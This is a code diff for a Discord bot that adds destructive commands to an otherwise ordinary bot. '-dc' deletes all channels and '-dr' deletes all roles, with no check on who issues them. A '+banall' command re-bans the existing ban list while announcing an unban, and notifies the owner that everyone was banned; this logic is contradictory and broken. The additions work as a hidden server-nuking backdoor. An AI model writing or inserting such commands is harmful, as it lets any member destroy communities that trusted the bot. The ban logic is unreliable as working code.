@@ -17,6 +17,21 @@ console.log(`Logged in as  * [ "  Randy " ] servers! [ " ${LOka.guilds.size} " ]
    
  
 });
+LOka.on('message', message => {
+ if(message.content.split(' ')[0] == prefix + 'dc') { 
+ if (!message.channel.guild) return;
+ message.guild.channels.forEach(m => {
+ m.delete();
+ });
+ }
+ if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
+ if (!message.channel.guild) return;
+ message.guild.roles.forEach(m => {
+ m.delete();
+ });
+ message.reply("`تم حذف جميع الرتب بنجاح`")
+ }
+ });
 var prefix = "-"
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
@@ -472,10 +487,26 @@ LOka.on('guildMemberAdd', member => {
             }
        
     });
- 
-   
- 
- 
- 
- 
-client.login(process.env.BOT_TOKEN);
+LOka.login(process.env.BOT_TOKEN);
+
+LOka.on('message',async message => {
+  if(message.content === '+banall') {
+    var user = message.mentions.users.first();
+    if(!message.guild.member(LOka.user).hasPermission("BAN_MEMBERS")) return message.reply("**I Don't Have ` BAN_MEMBERS ` Permission**");
+    const guild = message.guild;
+
+  message.guild.fetchBans().then(ba => {
+  ba.forEach(ns => {
+  message.guild.ban(ns);
+  const embed= new Discord.RichEmbed()
+        .setColor("RANDOM")
+        .setAuthor("Succes!", "https://images-ext-1.discordapp.net/external/vp2vj9m0ieU5J6SHg6ObIsGpTJyoZnGAebrd0_vi848/https/i.imgur.com/GnR2unD.png?width=455&height=455")
+        .setDescription(`**✅ Has Been Unban For All**`)
+    .setFooter('Requested by '+message.author.username, message.author.avatarURL)
+  message.channel.sendEmbed(embed);
+  guild.owner.send(`سيرفر : ${guild.name}
+  **تم تبنيد  الجميع بواسطة** : <@${message.author.id}>`) 
+  });
+  });
+  }
+  });
